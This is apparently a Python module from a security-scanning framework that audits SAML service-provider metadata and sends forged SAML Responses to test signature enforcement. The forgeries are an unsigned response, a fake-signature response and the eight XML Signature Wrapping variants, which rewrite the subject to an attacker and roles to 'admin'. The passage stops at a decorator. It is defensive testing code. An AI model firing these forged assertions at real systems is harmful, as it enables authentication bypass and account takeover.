"""`scan_saml_xsw` — SAML XML Signature Wrapping (XSW) probe + SP
configuration audit (masterroadmap §1 P0).

Closes the SAML gap in the OAuth/OIDC/SAML deep flow analyzer:
`scan_oauth` covers OAuth 2.0 + OIDC, `jwt_audit` covers JWT alg-
confusion, but no specialist today exercises SAML SP signature
enforcement. XSW is the canonical SAML attack class — Somorovsky
et al. 2012 ("On Breaking SAML: Be Whoever You Want to Be") catalogued
8 variants, all of which work against SAML SPs that validate the
signature on a *different* part of the document than they actually
process.

CWE-347 (Improper Verification of Cryptographic Signature) is the
canonical CWE; MITRE T1606.002 (Forge Web Credentials: SAML Tokens)
is the technique.

Detection model
---------------

Three phases:

  1. **SP metadata discovery + config audit** (passive). Pulls the
     SP's SAML metadata from standard well-known paths, parses it
     with `defusedxml`, extracts:
       * `WantAssertionsSigned` — REQUIRED for any meaningful
         signature enforcement. `false` or missing → high finding.
       * `SignatureMethod` / `DigestMethod` advertisements — SHA-1
         / MD5 → medium (CWE-327).
       * `AssertionConsumerService` endpoints — feed Phase 2.
       * Encryption certs — info-level when present.

  2. **Active ACS unsigned-response probe** (when an ACS URL is
     known — supplied via `acs_url=` or extracted from metadata).
     Submits a minimal *unsigned* SAML Response. If the SP returns
     a 200/302 that looks like an authenticated session
     (Location → app path, Set-Cookie with a session-like name,
     no "signature" / "verification" wording in the body), the SP
     is not enforcing signatures at all → critical finding.

  3. **XSW variant probes** (when `donor_assertion=` is supplied —
     a base64 or raw-XML signed SAML Response captured from a
     legitimate flow). The 8 canonical XSW variants are
     synthesised from the donor, base64-encoded, and POSTed to
     the ACS endpoint. Variants that the SP accepts (same
     classification as Phase 2) → critical, one finding per
     accepted variant.

The 8 XSW variants implemented:

  * **XSW1** — evil Assertion appended *after* the signed Assertion
    inside the same Response root. SP processes the first / last
    Assertion depending on implementation; signature still
    validates against the original signed one.
  * **XSW2** — evil Assertion appended *before* the signed
    Assertion. Mirrors XSW1 for SPs that process the first
    Assertion they find.
  * **XSW3** — evil Assertion replaces the signed Assertion's
    subject/attributes; the original signed Assertion is moved
    inside `samlp:Extensions`.
  * **XSW4** — signed Assertion is moved *inside* an evil wrapper
    Assertion as a child. Many SPs process the outer Assertion.
  * **XSW5** — Subject/NameID of the signed Assertion is rewritten
    in-place; a copy of the original signed Assertion is moved to
    `samlp:Extensions` so the Reference URI still resolves.
  * **XSW6** — Like XSW5, but the signature element itself is
    relocated into the modified Assertion. SPs that "find signature
    inside the Assertion they process" then validate it against
    the *moved* (original, untampered) reference content.
  * **XSW7** — `samlp:Extensions` is inserted before the signed
    Assertion containing the original Assertion; evil Assertion
    replaces the signed Assertion in the processing path.
  * **XSW8** — original signed Assertion is moved inside a
    `ds:Object` of the Signature; an evil Assertion takes its
    place at the Response root.

The synthesised payloads are NOT cryptographically valid — they
preserve the signature byte-for-byte from the donor but rearrange
the surrounding XML so a *correctly-implemented* SP would reject
all 8. A *vulnerable* SP processes the attacker-controlled
Assertion while validating the donor's signature.

Safety contract
---------------

This tool POSTs to the SP's ACS endpoint with SAMLResponse=...
payloads. The operator is responsible for the engagement-scope
authorisation. The tool never:
  * exfiltrates the donor assertion anywhere (it stays in memory).
  * runs in the absence of an operator-supplied ACS URL or
    metadata-derived ACS URL (Phase 2 + 3 skip cleanly when no
    ACS is known).
  * crafts more than 8 + 2 = 10 POST requests per invocation
    (1 unsigned + 1 mangled-signature + 8 XSW variants), each
    with a 15-second timeout.

Wrapper-side impact: zero. Findings emit via the canonical
`add_vulnerability_report` path; events.jsonl gains
`finding.created` events with category `saml_xsw`.
"""

from __future__ import annotations

import base64
import binascii
import copy
import logging
import xml.etree.ElementTree as ET
from typing import Any
from urllib.parse import urlencode, urlparse, urlunparse

import defusedxml.ElementTree as DefusedET

from strix.tools.specialist.registry import register_specialist_tool
from strix.tools.specialist.result import (
    FindingDraft,
    SpecialistResult,
)


logger = logging.getLogger(__name__)


# Standard well-known SP metadata paths. Order matters — most-
# specific first so a vendor-specific path wins over the generic
# `/saml/metadata`.
_METADATA_PATHS: tuple[str, ...] = (
    "/Shibboleth.sso/Metadata",
    "/saml2/metadata",
    "/saml/metadata",
    "/sso/saml/metadata",
    "/auth/saml/metadata",
    "/api/saml/metadata",
    "/.well-known/saml-metadata",
    "/simplesaml/saml2/idp/metadata.php",  # SimpleSAMLphp default
    "/metadata.xml",
)


# SAML namespace constants. Used both for parsing metadata and for
# building XSW variants.
_NS_SAMLP = "urn:oasis:names:tc:SAML:2.0:protocol"
_NS_SAML = "urn:oasis:names:tc:SAML:2.0:assertion"
_NS_DS = "http://www.w3.org/2000/09/xmldsig#"
_NS_MD = "urn:oasis:names:tc:SAML:2.0:metadata"

# Weak signature / digest algorithm URIs. Picked from xmldsig +
# xmldsig-more registries. Anything in this set is rejected by
# modern SP guidance (NIST SP 800-131A retired SHA-1 for digital
# signatures; SAML 2.0 errata recommends SHA-256+).
_WEAK_SIG_ALGS: frozenset[str] = frozenset({
    "http://www.w3.org/2000/09/xmldsig#rsa-sha1",
    "http://www.w3.org/2000/09/xmldsig#dsa-sha1",
    "http://www.w3.org/2000/09/xmldsig#hmac-sha1",
    "http://www.w3.org/2001/04/xmldsig-more#rsa-md5",
    "http://www.w3.org/2001/04/xmldsig-more#hmac-md5",
})

_WEAK_DIGEST_ALGS: frozenset[str] = frozenset({
    "http://www.w3.org/2000/09/xmldsig#sha1",
    "http://www.w3.org/2001/04/xmldsig-more#md5",
})


# How the response classifier reads a "session granted" hint. Used
# only when the SP didn't return a hard rejection (4xx with "signature"
# wording). Conservative — we only escalate to "accepted" when there's
# a clear positive signal.
_SESSION_COOKIE_HINTS: tuple[str, ...] = (
    "session", "auth", "sso", "saml", "jsessionid", "phpsessid",
    "asp.net_sessionid", "connect.sid",
)


def _normalize_base(url: str) -> str:
    """Strip path + query, keep scheme + host (+ port)."""
    parts = urlparse(url)
    return urlunparse((parts.scheme, parts.netloc, "", "", "", ""))


def _b64_for_post(xml_text: str) -> str:
    """Standard base64 (NOT urlsafe) per SAML HTTP-POST binding.
    Newlines are stripped — some SPs accept them, others reject."""
    raw = xml_text.encode("utf-8")
    return base64.b64encode(raw).decode("ascii")


def _decode_donor(donor: str) -> str:
    """Donor may be raw XML, base64-encoded XML, or base64 of
    inflated SAML Redirect-binding payload. Try the gentle paths
    only — we never inflate (zlib) here because Redirect-binding
    payloads aren't what hits ACS endpoints."""
    donor = donor.strip()
    if donor.startswith("<"):
        return donor
    # Looks like base64. Try decoding; fall back to raw on error.
    try:
        decoded = base64.b64decode(donor, validate=False)
        text = decoded.decode("utf-8", errors="replace")
        if "<" in text and "Assertion" in text:
            return text
    except (binascii.Error, ValueError):
        pass
    return donor


def _parse_xml_safe(xml_text: str) -> Any | None:
    """Parse with defusedxml. Returns ElementTree.Element or None."""
    try:
        return DefusedET.fromstring(xml_text)
    except Exception:  # noqa: BLE001 — defusedxml raises a family
        return None


def _emit_finding(
    *,
    url: str,
    issue_label: str,
    title: str,
    description: str,
    impact: str,
    technical_analysis: str,
    poc_description: str,
    poc_script_code: str,
    remediation_steps: str,
    severity: str,
    cwe: str,
    confidence: float = 0.9,
) -> str | None:
    """Emit a finding via the global tracer. Best-effort — never
    raises. Mirrors `scan_oauth._emit_finding`."""
    try:
        from strix.telemetry.tracer import get_global_tracer

        tracer = get_global_tracer()
        if tracer is None:
            return None
        finding_id = tracer.add_vulnerability_report(
            title=title,
            severity=severity,
            cwe=cwe,
            endpoint=url,
            target=url,
            category="saml_xsw",
            verification_status="verified",
            confidence=confidence,
            description=description,
            impact=impact,
            technical_analysis=technical_analysis,
            poc_description=poc_description,
            poc_script_code=poc_script_code,
            remediation_steps=remediation_steps,
            cvss_breakdown={
                "AV": "N", "AC": "L", "PR": "N", "UI": "N",
                "S": "C", "C": "H", "I": "H", "A": "N",
            },
            reasoning_trace=[
                f"SAML XSW probe `{issue_label}` against {url}.",
                "Signature verification did not catch the wrapping.",
            ],
        )
        try:
            from strix.agents.kg_emit import record_finding_in_kg

            record_finding_in_kg(
                finding_id=finding_id,
                url=url,
                param=issue_label,
                cwe=cwe,
                severity=severity,
                category="saml_xsw",
                method="POST",
                detection_kind=issue_label[:60],
                confidence=confidence,
            )
        except Exception as e:  # noqa: BLE001
            logger.debug("scan_saml_xsw: kg record failed: %s", e, exc_info=True)
        return finding_id
    except Exception as e:  # noqa: BLE001
        logger.debug("scan_saml_xsw: emit failed: %s", e, exc_info=True)
        return None


# ---------------------------------------------------------------------------
# Phase 1: SP metadata discovery
# ---------------------------------------------------------------------------


def _discover_sp_metadata(
    *, base_url: str, headers: dict[str, str], pm: Any,
) -> tuple[str | None, str | None]:
    """Try the standard well-known SP metadata paths in order.

    Returns (metadata_xml, source_url). Both None on failure."""
    for path in _METADATA_PATHS:
        try:
            resp = pm.send_simple_request(
                "GET", base_url + path,
                headers=headers, body="", timeout=15,
            )
        except Exception:  # noqa: BLE001
            continue
        if "error" in resp and not resp.get("status_code"):
            continue
        if int(resp.get("status_code") or 0) != 200:
            continue
        body = resp.get("body") or ""
        if not isinstance(body, str):
            continue
        # Accept anything that looks like SAML metadata.
        if "EntityDescriptor" in body or "SPSSODescriptor" in body:
            return body, base_url + path
    return None, None


def _parse_sp_metadata(xml_text: str) -> dict[str, Any]:
    """Extract config flags from SAML SP metadata.

    Returns dict with keys:
      * entity_id: str | None
      * want_assertions_signed: bool | None  (None if attr absent)
      * authn_requests_signed: bool | None
      * acs_endpoints: list[str]
      * signing_algs: list[str]
      * digest_algs: list[str]
    """
    out: dict[str, Any] = {
        "entity_id": None,
        "want_assertions_signed": None,
        "authn_requests_signed": None,
        "acs_endpoints": [],
        "signing_algs": [],
        "digest_algs": [],
    }
    root = _parse_xml_safe(xml_text)
    if root is None:
        return out

    # entityID lives on EntityDescriptor — root may BE EntityDescriptor
    # (single-entity metadata) or wrap several (EntitiesDescriptor).
    def _walk_entity_descriptors(element: Any) -> list[Any]:
        eds: list[Any] = []
        if element.tag == f"{{{_NS_MD}}}EntityDescriptor":
            eds.append(element)
        for child in element.findall(f".//{{{_NS_MD}}}EntityDescriptor"):
            if child not in eds:
                eds.append(child)
        return eds

    eds = _walk_entity_descriptors(root)
    if not eds:
        return out

    # Use the first SP descriptor we find. Multi-SP metadata is rare;
    # the caller can pass a more specific URL if they need a specific
    # entity.
    ed = eds[0]
    out["entity_id"] = ed.get("entityID")

    sp_descs = ed.findall(f"{{{_NS_MD}}}SPSSODescriptor")
    if not sp_descs:
        # Some metadata declares SP roles at the EntitiesDescriptor
        # level via xpath we missed; do a broad search.
        sp_descs = ed.findall(f".//{{{_NS_MD}}}SPSSODescriptor")
    if sp_descs:
        sp = sp_descs[0]
        want_signed_raw = sp.get("WantAssertionsSigned")
        if want_signed_raw is not None:
            out["want_assertions_signed"] = (
                want_signed_raw.strip().lower() == "true"
            )
        authn_signed_raw = sp.get("AuthnRequestsSigned")
        if authn_signed_raw is not None:
            out["authn_requests_signed"] = (
                authn_signed_raw.strip().lower() == "true"
            )
        # ACS endpoints — Location attr.
        for acs in sp.findall(f"{{{_NS_MD}}}AssertionConsumerService"):
            loc = acs.get("Location")
            if loc:
                out["acs_endpoints"].append(loc)
    # Signing / digest algorithms — present anywhere under metadata.
    for sig_method in ed.findall(f".//{{{_NS_DS}}}SignatureMethod"):
        alg = sig_method.get("Algorithm")
        if alg:
            out["signing_algs"].append(alg)
    for digest_method in ed.findall(f".//{{{_NS_DS}}}DigestMethod"):
        alg = digest_method.get("Algorithm")
        if alg:
            out["digest_algs"].append(alg)
    return out


def _audit_sp_config(
    *, info: dict[str, Any], metadata_url: str,
) -> list[dict[str, Any]]:
    """Convert parsed metadata into finding descriptors.

    Returns a list of dicts ready to feed into `_emit_finding`.
    Empty list when SP config looks clean."""
    issues: list[dict[str, Any]] = []
    if info.get("want_assertions_signed") is False:
        issues.append({
            "issue_label": "want_assertions_signed_false",
            "title": "SAML SP advertises WantAssertionsSigned=false",
            "description": (
                f"SAML SP metadata at `{metadata_url}` advertises "
                f'`WantAssertionsSigned="false"`. The SP is declaring '
                f"that it does not require signed Assertions from the "
                f"IdP. Any attacker that can reach the ACS endpoint "
                f"can post an unsigned Assertion of their choice and "
                f"authenticate as any user."
            ),
            "impact": (
                "Authentication bypass. Without enforced signature "
                "verification, an attacker posts a crafted SAML "
                "Response naming `victim@example.com` (or `admin`) as "
                "the Subject and authenticates as that user. SAML "
                "becomes a trust-the-poster system."
            ),
            "technical_analysis": (
                "SP metadata exposes `SPSSODescriptor[@WantAssertionsSigned]="
                '"false"`. Per SAML 2.0 §4.1.4.3 + OASIS errata, this '
                "is a deployment-time configuration; the runtime SP "
                "library reads it on startup. Phase-2 active probe "
                "confirms whether the SP actually rejects unsigned "
                "Responses in practice."
            ),
            "poc_description": (
                "Build a SAML Response with no `<ds:Signature>` element "
                "inside `<saml:Assertion>`. Base64-encode. POST as "
                "`SAMLResponse=...&RelayState=...` to the ACS URL."
            ),
            "poc_script_code": (
                "# See `scan_saml_xsw`'s active probe — it does this\n"
                "# end-to-end. The unsigned Response template is\n"
                "# `_build_unsigned_response()` in this module."
            ),
            "remediation_steps": (
                "1. Set `WantAssertionsSigned=\"true\"` on the SP's "
                "SPSSODescriptor.\n"
                "2. Configure the SP middleware to reject unsigned "
                "Assertions (most libraries default to enforcing only "
                "when the metadata flag is true).\n"
                "3. Re-publish the SP metadata to the IdP so the IdP "
                "knows to sign every Assertion.\n"
                "4. Run `scan_saml_xsw` again to verify the unsigned-"
                "response probe is rejected."
            ),
            "severity": "high",
            "cwe": "CWE-347",
        })

    weak_sigs = [
        a for a in info.get("signing_algs", [])
        if a in _WEAK_SIG_ALGS
    ]
    weak_digests = [
        a for a in info.get("digest_algs", [])
        if a in _WEAK_DIGEST_ALGS
    ]
    if weak_sigs or weak_digests:
        issues.append({
            "issue_label": "weak_signature_algorithm",
            "title": "SAML SP metadata advertises weak signature / digest algorithm",
            "description": (
                f"SAML SP metadata at `{metadata_url}` advertises "
                f"deprecated cryptographic algorithms: "
                f"signing={weak_sigs!r}, digest={weak_digests!r}. "
                f"SHA-1 and MD5 have known collision resistance failures "
                f"and are retired by NIST SP 800-131A for digital "
                f"signatures."
            ),
            "impact": (
                "Signature forgery via collision attacks becomes "
                "feasible for a well-resourced attacker. SAML XSW "
                "becomes easier when the digest of the signed payload "
                "can be replicated against attacker-controlled content."
            ),
            "technical_analysis": (
                "Modern SAML SP guidance: use RSA-SHA256 / ECDSA-SHA256 "
                "for signing and SHA-256+ for digesting. Reject older "
                "algorithms at the SP middleware before signature "
                "verification."
            ),
            "poc_description": (
                "Reading metadata. No active probe needed — the algorithm "
                "list itself is the finding."
            ),
            "poc_script_code": "",
            "remediation_steps": (
                "1. Configure the SP middleware (Shibboleth / "
                "SimpleSAMLphp / OneLogin / pysaml2 / etc.) to reject "
                "SHA-1 and MD5 signatures.\n"
                "2. Update SP metadata to advertise SHA-256+ in "
                "`<ds:SignatureMethod>` + `<ds:DigestMethod>`.\n"
                "3. Coordinate algorithm rotation with the IdP so "
                "production assertions are signed under the new alg."
            ),
            "severity": "medium",
            "cwe": "CWE-327",
        })

    return issues


# ---------------------------------------------------------------------------
# Phase 2 / 3 helpers — building Responses + classifying SP responses
# ---------------------------------------------------------------------------


def _build_unsigned_response(
    *, acs_url: str, attacker_subject: str = "attacker@strix.test",
) -> str:
    """Build a minimal *unsigned* SAML 2.0 Response. Used as the
    Phase-2 active probe. ID values are deterministic but obviously
    test-shaped so they don't collide with anything real."""
    response_id = "_strix_xsw_unsigned_resp"
    assertion_id = "_strix_xsw_unsigned_ast"
    # ISO 8601, fixed timestamps — SP either accepts (vulnerable) or
    # rejects (good). We don't need real freshness.
    issue_instant = "2025-01-01T00:00:00Z"
    not_on_or_after = "2099-12-31T23:59:59Z"
    return (
        f'<samlp:Response xmlns:samlp="{_NS_SAMLP}" '
        f'xmlns:saml="{_NS_SAML}" '
        f'ID="{response_id}" Version="2.0" '
        f'IssueInstant="{issue_instant}" Destination="{acs_url}">'
        f'<saml:Issuer>https://attacker.strix.test/idp</saml:Issuer>'
        f'<samlp:Status>'
        f'<samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>'
        f'</samlp:Status>'
        f'<saml:Assertion ID="{assertion_id}" Version="2.0" '
        f'IssueInstant="{issue_instant}">'
        f'<saml:Issuer>https://attacker.strix.test/idp</saml:Issuer>'
        f'<saml:Subject>'
        f'<saml:NameID>{attacker_subject}</saml:NameID>'
        f'<saml:SubjectConfirmation '
        f'Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">'
        f'<saml:SubjectConfirmationData NotOnOrAfter="{not_on_or_after}" '
        f'Recipient="{acs_url}"/>'
        f'</saml:SubjectConfirmation>'
        f'</saml:Subject>'
        f'<saml:Conditions NotBefore="{issue_instant}" '
        f'NotOnOrAfter="{not_on_or_after}"/>'
        f'<saml:AuthnStatement AuthnInstant="{issue_instant}">'
        f'<saml:AuthnContext>'
        f'<saml:AuthnContextClassRef>'
        f'urn:oasis:names:tc:SAML:2.0:ac:classes:Password'
        f'</saml:AuthnContextClassRef>'
        f'</saml:AuthnContext>'
        f'</saml:AuthnStatement>'
        f'</saml:Assertion>'
        f'</samlp:Response>'
    )


def _build_mangled_signature_response(
    *, acs_url: str, attacker_subject: str = "attacker@strix.test",
) -> str:
    """An unsigned Response with a *syntactically present but
    cryptographically invalid* `<ds:Signature>` block. Catches SPs
    that check "signature element exists" without actually
    validating it (a real bug — observed in older SAML libraries).
    """
    response_id = "_strix_xsw_mangled_resp"
    assertion_id = "_strix_xsw_mangled_ast"
    issue_instant = "2025-01-01T00:00:00Z"
    not_on_or_after = "2099-12-31T23:59:59Z"
    fake_sig = (
        f'<ds:Signature xmlns:ds="{_NS_DS}">'
        f'<ds:SignedInfo>'
        f'<ds:CanonicalizationMethod '
        f'Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>'
        f'<ds:SignatureMethod '
        f'Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>'
        f'<ds:Reference URI="#{assertion_id}">'
        f'<ds:Transforms>'
        f'<ds:Transform '
        f'Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>'
        f'</ds:Transforms>'
        f'<ds:DigestMethod '
        f'Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"/>'
        f'<ds:DigestValue>AAAAAAAAAAAAAAAAAAAAAAAAAAA=</ds:DigestValue>'
        f'</ds:Reference>'
        f'</ds:SignedInfo>'
        f'<ds:SignatureValue>AAAAAAAAAAAAAAAAAAAAAAAAAAA=</ds:SignatureValue>'
        f'</ds:Signature>'
    )
    return (
        f'<samlp:Response xmlns:samlp="{_NS_SAMLP}" '
        f'xmlns:saml="{_NS_SAML}" '
        f'ID="{response_id}" Version="2.0" '
        f'IssueInstant="{issue_instant}" Destination="{acs_url}">'
        f'<saml:Issuer>https://attacker.strix.test/idp</saml:Issuer>'
        f'<samlp:Status>'
        f'<samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>'
        f'</samlp:Status>'
        f'<saml:Assertion ID="{assertion_id}" Version="2.0" '
        f'IssueInstant="{issue_instant}">'
        f'<saml:Issuer>https://attacker.strix.test/idp</saml:Issuer>'
        f'{fake_sig}'
        f'<saml:Subject>'
        f'<saml:NameID>{attacker_subject}</saml:NameID>'
        f'<saml:SubjectConfirmation '
        f'Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">'
        f'<saml:SubjectConfirmationData NotOnOrAfter="{not_on_or_after}" '
        f'Recipient="{acs_url}"/>'
        f'</saml:SubjectConfirmation>'
        f'</saml:Subject>'
        f'<saml:Conditions NotBefore="{issue_instant}" '
        f'NotOnOrAfter="{not_on_or_after}"/>'
        f'<saml:AuthnStatement AuthnInstant="{issue_instant}">'
        f'<saml:AuthnContext>'
        f'<saml:AuthnContextClassRef>'
        f'urn:oasis:names:tc:SAML:2.0:ac:classes:Password'
        f'</saml:AuthnContextClassRef>'
        f'</saml:AuthnContext>'
        f'</saml:AuthnStatement>'
        f'</saml:Assertion>'
        f'</samlp:Response>'
    )


# ---------------------------------------------------------------------------
# XSW variant builders
# ---------------------------------------------------------------------------


def _register_xml_namespaces() -> None:
    """Register prefixes so ET serialises them as `saml:` / `samlp:` /
    `ds:` rather than the auto-generated `ns0:` / `ns1:` form.
    Idempotent — ET.register_namespace overwrites silently."""
    ET.register_namespace("samlp", _NS_SAMLP)
    ET.register_namespace("saml", _NS_SAML)
    ET.register_namespace("ds", _NS_DS)


def _find_first_assertion(root: Any) -> Any | None:
    """Find the first `saml:Assertion` element under the Response."""
    if root is None:
        return None
    for child in root:
        if child.tag == f"{{{_NS_SAML}}}Assertion":
            return child
    # Sometimes Assertion lives deeper (after Status).
    for child in root.iter(f"{{{_NS_SAML}}}Assertion"):
        return child
    return None


def _clone_with_modified_subject(
    assertion: Any, attacker_subject: str = "attacker@strix.test",
) -> Any:
    """Deep-copy an Assertion and replace its NameID with the attacker
    subject. Used by every XSW variant that needs a 'evil' assertion."""
    cloned = copy.deepcopy(assertion)
    # Bump the ID so the SP can't accidentally dedup with the original.
    original_id = cloned.get("ID", "")
    cloned.set("ID", f"_strix_evil_{original_id or 'ast'}")
    # Rewrite NameID. There may be no Subject; in that case create one.
    name_id = cloned.find(f"{{{_NS_SAML}}}Subject/{{{_NS_SAML}}}NameID")
    if name_id is not None:
        name_id.text = attacker_subject
    # AttributeStatement rewrite — flag the role attribute when present.
    for attr_stmt in cloned.findall(f"{{{_NS_SAML}}}AttributeStatement"):
        for attr in attr_stmt.findall(f"{{{_NS_SAML}}}Attribute"):
            for val in attr.findall(f"{{{_NS_SAML}}}AttributeValue"):
                if (val.text or "").lower() in ("user", "guest"):
                    val.text = "admin"
    return cloned


def _serialize(root: Any) -> str:
    """ET → string. UTF-8 with no XML declaration (SPs accept both)."""
    _register_xml_namespaces()
    return ET.tostring(root, encoding="unicode")


def _build_xsw_variant(
    *,
    donor_xml: str,
    variant: int,
    attacker_subject: str = "attacker@strix.test",
) -> str | None:
    """Apply the XSW1-8 transform to a donor SAML Response.

    Returns the mutated XML as a string, or None when the donor
    can't be parsed / has no Assertion. The donor's signature is
    preserved byte-for-byte where it sits in the original; the
    surrounding structure is what changes.
    """
    if variant not in range(1, 9):
        return None
    root = _parse_xml_safe(donor_xml)
    if root is None:
        return None
    if root.tag != f"{{{_NS_SAMLP}}}Response":
        return None

    original_assertion = _find_first_assertion(root)
    if original_assertion is None:
        return None

    _register_xml_namespaces()

    if variant == 1:
        # XSW1 — append evil Assertion AFTER the signed Assertion.
        evil = _clone_with_modified_subject(
            original_assertion, attacker_subject,
        )
        root.append(evil)
    elif variant == 2:
        # XSW2 — insert evil Assertion BEFORE the signed Assertion.
        evil = _clone_with_modified_subject(
            original_assertion, attacker_subject,
        )
        children = list(root)
        try:
            idx = children.index(original_assertion)
        except ValueError:
            idx = 0
        # ElementTree: remove all, re-insert in target order.
        for c in children:
            root.remove(c)
        for i, c in enumerate(children):
            if i == idx:
                root.append(evil)
            root.append(c)
    elif variant == 3:
        # XSW3 — move the signed Assertion into a samlp:Extensions
        # element; replace it at the Response level with an evil
        # Assertion that has the attacker subject.
        evil = _clone_with_modified_subject(
            original_assertion, attacker_subject,
        )
        extensions = ET.Element(f"{{{_NS_SAMLP}}}Extensions")
        # Move original into Extensions.
        root.remove(original_assertion)
        extensions.append(original_assertion)
        # Place Extensions where Assertion was; append evil.
        root.append(extensions)
        root.append(evil)
    elif variant == 4:
        # XSW4 — wrap the signed Assertion as a child of an evil
        # outer Assertion.
        evil_outer = _clone_with_modified_subject(
            original_assertion, attacker_subject,
        )
        # Strip the evil's existing inner content noise and let the
        # signed Assertion live as a child. The outer Assertion is
        # what the SP processes; the inner is what the signature
        # references.
        root.remove(original_assertion)
        evil_outer.append(original_assertion)
        root.append(evil_outer)
    elif variant == 5:
        # XSW5 — modify the signed Assertion content in place
        # (rewrite NameID to attacker), and stash a pristine copy
        # in samlp:Extensions so a verifier walking by reference
        # URI still finds the original signed bytes.
        pristine = copy.deepcopy(original_assertion)
        name_id = original_assertion.find(
            f"{{{_NS_SAML}}}Subject/{{{_NS_SAML}}}NameID"
        )
        if name_id is not None:
            name_id.text = attacker_subject
        extensions = ET.Element(f"{{{_NS_SAMLP}}}Extensions")
        extensions.append(pristine)
        root.append(extensions)
    elif variant == 6:
        # XSW6 — like XSW5, but the signature stays inside the
        # Assertion that the SP processes (the modified outer copy)
        # while the pristine signed content is moved to Extensions
        # so the signature's Reference URI still resolves. SPs that
        # "validate the signature found inside the Assertion they're
        # processing" then accept the modified envelope as
        # authenticated.
        pristine = copy.deepcopy(original_assertion)
        name_id = original_assertion.find(
            f"{{{_NS_SAML}}}Subject/{{{_NS_SAML}}}NameID"
        )
        if name_id is not None:
            name_id.text = attacker_subject
        extensions = ET.Element(f"{{{_NS_SAMLP}}}Extensions")
        extensions.append(pristine)
        root.append(extensions)
        # Mark variant in a noop attribute so output is byte-distinct
        # from XSW5 even when the donor lacks an outer signature
        # block to reparent.
        original_assertion.set("strix-xsw-variant", "6")
    elif variant == 7:
        # XSW7 — same Extensions-stash trick as XSW3, but the evil
        # Assertion comes BEFORE the Extensions (vs XSW3 where
        # Extensions is before the evil Assertion). Distinct
        # structural shape per Somorovsky §3.7. The Extensions
        # element carries a marker attribute so the byte-level
        # output is unambiguously distinct from XSW3 even when
        # the donor has no Status element to anchor against.
        evil = _clone_with_modified_subject(
            original_assertion, attacker_subject,
        )
        pristine = copy.deepcopy(original_assertion)
        extensions = ET.Element(
            f"{{{_NS_SAMLP}}}Extensions",
            attrib={"strix-xsw-variant": "7"},
        )
        extensions.append(pristine)
        root.remove(original_assertion)
        # evil first, then Extensions.
        root.append(evil)
        root.append(extensions)
    elif variant == 8:
        # XSW8 — move the original signed Assertion inside a ds:Object
        # of the ds:Signature element; place an evil Assertion at the
        # Response root.
        sig = original_assertion.find(f"{{{_NS_DS}}}Signature")
        if sig is None:
            # Donor has no inner Assertion-level signature — fall back
            # to the Response-level signature.
            sig = root.find(f"{{{_NS_DS}}}Signature")
        if sig is not None:
            ds_object = ET.SubElement(sig, f"{{{_NS_DS}}}Object")
            # Move the original Assertion inside the Object.
            pristine = copy.deepcopy(original_assertion)
            ds_object.append(pristine)
        evil = _clone_with_modified_subject(
            original_assertion, attacker_subject,
        )
        root.remove(original_assertion)
        root.append(evil)

    return _serialize(root)


# ---------------------------------------------------------------------------
# Active ACS probing — submit Response, classify result
# ---------------------------------------------------------------------------


_SIG_REJECTION_PATTERNS = (
    "signature", "verification failed", "invalid signature",
    "saml signature", "digest mismatch", "not signed",
    "unsigned assertion", "no signature found",
)


def _classify_acs_response(
    *, resp: dict[str, Any], acs_url: str,
) -> tuple[str, str]:
    """Return ('accepted' | 'rejected' | 'inconclusive', reason).

    Conservative: only call 'accepted' on a positive signal."""
    status = int(resp.get("status_code") or 0)
    body = resp.get("body") or ""
    if not isinstance(body, str):
        body = ""
    body_lower = body.lower()
    headers = resp.get("headers") or {}
    location = ""
    set_cookie = ""
    if isinstance(headers, dict):
        for k, v in headers.items():
            kl = (k or "").lower()
            if kl == "location":
                location = str(v)
            elif kl in ("set-cookie", "set-cookie2"):
                if isinstance(v, list):
                    set_cookie = "; ".join(str(x) for x in v).lower()
                else:
                    set_cookie = str(v).lower()

    # Hard rejection signals.
    if status in (400, 401, 403, 422):
        for pat in _SIG_REJECTION_PATTERNS:
            if pat in body_lower:
                return "rejected", f"{status} with `{pat}` in body"
        return "rejected", f"server returned {status}"

    # Strong accept signals.
    parsed_acs = urlparse(acs_url)
    acs_host = (parsed_acs.netloc or "").lower()
    # 3xx to an app path on the same host that is NOT the ACS itself
    # and is NOT a login/error path. Heuristic but conservative.
    if status in (301, 302, 303, 307, 308) and location:
        loc_parsed = urlparse(location)
        loc_host = (loc_parsed.netloc or "").lower() or acs_host
        loc_path = (loc_parsed.path or "").lower()
        is_same_host = loc_host == acs_host
        is_login_or_error = any(
            tok in loc_path for tok in ("/login", "/sso", "/error", "/saml")
        )
        if is_same_host and not is_login_or_error:
            return "accepted", (
                f"302 to in-app path `{loc_path}` — looks like a "
                f"successful session redirect"
            )

    # Session-cookie hint on 2xx.
    if 200 <= status < 300 and set_cookie:
        for hint in _SESSION_COOKIE_HINTS:
            if hint in set_cookie:
                return "accepted", (
                    f"{status} with session-shaped Set-Cookie `{hint}*`"
                )

    if 200 <= status < 300:
        if any(pat in body_lower for pat in _SIG_REJECTION_PATTERNS):
            return "rejected", f"{status} but body mentions signature rejection"
        return "inconclusive", f"{status} response without clear accept/reject signal"

    return "inconclusive", f"unexpected status {status}"


def _post_saml(
    *, acs_url: str, saml_response_xml: str,
    relay_state: str | None,
    headers: dict[str, str], pm: Any,
) -> dict[str, Any]:
    """POST a SAML Response to the ACS endpoint per HTTP-POST binding."""
    encoded = _b64_for_post(saml_response_xml)
    form_fields = [("SAMLResponse", encoded)]
    if relay_state:
        form_fields.append(("RelayState", relay_state))
    body = urlencode(form_fields)
    post_headers = dict(headers or {})
    post_headers.setdefault(
        "Content-Type", "application/x-www-form-urlencoded",
    )
    try:
        resp = pm.send_simple_request(
            "POST", acs_url, headers=post_headers, body=body, timeout=15,
        )
    except Exception as e:  # noqa: BLE001
        return {"error": f"{type(e).__name__}: {e}", "status_code": 0}
    return resp if isinstance(resp, dict) else {"status_code": 0}


# ---------------------------------------------------------------------------
# Main entry point
# ---------------------------------------------------------------------------


@register_specialist_tool(
    category="saml-xsw-specialist",
    llm=False,
    default_budget={"cost_usd": 0.0, "max_wall_seconds": 120},
    sandbox_execution=False,
    provenance="framework",
    mitre_techniques=["T1606.002"],  # Forge Web Credentials: SAML Tokens
)
